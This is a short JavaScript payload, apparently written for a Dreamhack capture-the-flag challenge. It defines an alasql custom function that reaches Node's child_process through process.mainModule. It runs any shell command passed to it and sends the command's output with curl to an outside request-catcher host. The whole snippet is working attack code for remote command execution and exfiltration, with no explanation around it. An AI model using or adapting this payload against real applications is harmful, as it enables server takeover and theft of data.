alasql.fn.pwn = function(a) {
    try {
        const mod = globalThis.process.mainModule.constructor._load('child_process');
        
        mod.execSync(`curl https://chzgpoe.request.dreamhack.games/?data=$(${a})`);
        
        return "OK"; 
    } catch(e) {
        return e.message; // 에러 디버깅용
    }
};



